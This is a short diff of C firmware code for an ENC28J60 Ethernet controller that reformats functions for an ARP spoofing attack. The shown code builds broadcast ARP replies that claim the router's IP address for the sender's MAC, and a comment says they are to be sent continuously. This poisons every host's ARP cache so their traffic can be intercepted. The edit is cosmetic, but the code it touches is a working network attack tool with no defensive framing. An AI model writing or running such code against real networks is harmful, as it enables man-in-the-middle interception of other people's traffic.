@@ -8,13 +8,18 @@ uint8_t packet_rate = 100;
 
 /**
  * Function to set our arp message for attack
- * 
+ *
  */
-void set_arp_message_for_attack_all(uint8_t* buffer, uint8_t* MAC, uint8_t* ip_for_router,uint16_t* len) {
+void set_arp_message_for_attack_all(
+    uint8_t* buffer,
+    uint8_t* MAC,
+    uint8_t* ip_for_router,
+    uint16_t* len) {
     set_ethernet_header(buffer, MAC, MAC_BROADCAST, 0x806);
 
     // For the ArpSpoofing we need to send this continuosly
-    arp_set_header_ipv4(buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);
+    arp_set_header_ipv4(
+        buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);
 
     // Set the length of the message
     *len = ETHERNET_HEADER_LEN + ARP_LEN;
@@ -22,7 +27,7 @@ void set_arp_message_for_attack_all(uint8_t* buffer, uint8_t* MAC, uint8_t* ip_f
 
 /**
  * Function to attack the ethernet network with arp spoofing
- * 
+ *
  * Buffer needs to set before with an arp function to set the message
  */
 void send_arp_spoofing(enc28j60_t* ethernet, uint8_t* buffer, uint16_t len) {
